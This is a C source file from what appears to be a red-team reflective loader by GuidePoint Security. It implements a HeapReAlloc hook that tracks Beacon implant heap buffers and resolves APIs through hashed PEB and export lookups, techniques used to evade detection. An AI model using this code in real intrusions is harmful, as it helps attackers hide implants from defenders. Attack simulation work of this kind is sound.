/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlReAllocateHeap );
} API ;

/* API Hashes */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Rellocates a block of heap memory, and replaces
 * its original pointer with the updated buffer
 * and size.
 *
!*/
D_SEC( D ) PVOID WINAPI HeapReAlloc_Hook( _In_ HANDLE ProcessHeap, _In_ ULONG Flags, _In_ PVOID lpMem, _In_ SIZE_T Length )
{
	API			Api;

	LPVOID			Buf = NULL;
	PTABLE			Tbl = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PHEAP_ENTRY_BEACON	Heb = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlReAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );

	/* Get heap header and entry(s) */
	Tbl = C_PTR( G_SYM( Table ) );
	Hdr = C_PTR( & Tbl->Table->HeapList );
	Ent = C_PTR( Hdr->Flink );

	/* Enumerate heap entries */
	for ( ; Hdr != Ent ; Ent = C_PTR( Ent->Flink ) ) {
		/* Get pointer to the heap list structure */
		Heb = C_PTR( CONTAINING_RECORD( Ent, HEAP_ENTRY_BEACON, HeapList ) );

		/* Is our pointer? */
		if ( Heb->Buffer == C_PTR( lpMem ) ) { 
			/* ReAllocate a new buffer to hold new payload */
			if ( ( Buf = Api.RtlReAllocateHeap( ProcessHeap, Flags, lpMem, Length ) ) != NULL ) {
				/* Replace Info */
				Heb->Buffer = C_PTR( Buf );
				Heb->Length = C_PTR( Length );
			};
			/* Abort */
			break;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Return */
	return C_PTR( Buf );
};
